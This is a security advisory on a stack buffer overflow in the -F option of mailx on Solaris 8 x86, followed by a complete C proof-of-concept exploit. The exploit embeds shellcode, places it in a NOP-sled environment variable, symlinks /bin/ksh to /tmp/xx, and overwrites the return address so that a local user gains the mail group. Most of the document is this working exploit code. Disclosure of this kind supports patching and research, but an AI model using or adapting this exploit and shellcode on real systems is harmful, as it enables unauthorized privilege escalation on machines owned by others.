source: http://www.securityfocus.com/bid/2610/info

Solaris is the variant of the UNIX Operating System distributed by Sun Microsystems. Solaris is designed as a scalable operating system for the Intel x86 and Sun Sparc platforms, and operates on machines varying from desktop to enterprise server.

A problem with the handling of a long string of characters by the -F option makes it possible for a local user to gain elevated privileges. Due to the insufficient handling of input by the -F option of mailx, a buffer overflow at 1150 characters makes it possible to overwrite variables on the stack, including the return address.

This problem makes it possible for a local user gain elevated privileges, attaining an effective GID of mail. 

#include <fcntl.h>

/*

   /usr/bin/mailx overflow proof of conecpt.


   Pablo Sor, Buenos Aires, Argentina 04/2001
   psor@afip.gov.ar, psor@ccc.uba.ar

   works against x86 solaris 8

   default offset should work.

   usage:

   bash$ id
   uid=100(laika) gid=1(other)

   bash$ ./mailx-exp
   Subject: tomy
   .
   EOT

   [wait...]

   $ id
   uid=100(laika) gid=1(other) egid=6(mail)


*/

long get_esp() { __asm__("movl %esp,%eax"); }

int main(int ac, char **av)
{

char shell[]=
"\xeb\x1c\x5e\x33\xc0\x33\xdb\xb3\x08\xfe\xc3\x2b\xf3\x88\x06"
"\x6a\x06\x50\xb0\x88\x9a\xff\xff\xff\xff\x07\xee\xeb\x06\x90"
"\xe8\xdf\xff\xff\xff\x55\x8b\xec\x83\xec\x08\xeb\x5d\x33\xc0"
"\xb0\x3a\xfe\xc0\xeb\x16\xc3\x33\xc0\x40\xeb\x10\xc3\x5e\x33"
"\xdb\x89\x5e\x01\xc6\x46\x05\x07\x88\x7e\x06\xeb\x05\xe8\xec"
"\xff\xff\xff\x9a\xff\xff\xff\xff\x0f\x0f\xc3\x5e\x33\xc0\x89"
"\x76\x08\x88\x46\x07\x33\xd2\xb2\x06\x02\xd2\x89\x04\x16\x50"
"\x8d\x46\x08\x50\x8b\x46\x08\x50\xe8\xb5\xff\xff\xff\x33\xd2"
"\xb2\x06\x02\xd2\x03\xe2\x6a\x01\xe8\xaf\xff\xff\xff\x83\xc4"
"\x04\xe8\xc9\xff\xff\xff\x2f\x74\x6d\x70\x2f\x78\x78";

 unsigned long magic = get_esp() + 2075;  /* default offset */
 unsigned char buf[1150];
 char *envi;

 envi = (char *)malloc(300*sizeof(char));
 memset(envi,0x90,300);
 memcpy(envi+280-strlen(shell),shell,strlen(shell));
 memcpy(envi,"SOR=",4);
 envi[299]=0;
 putenv(envi);

 symlink("/bin/ksh","/tmp/xx");
 memset(buf,0x41,1150);
 memcpy(buf+1116,&magic,4);
 buf[1149]=0;
 execl("/usr/bin/mailx","mailx","-F",buf,NULL);
}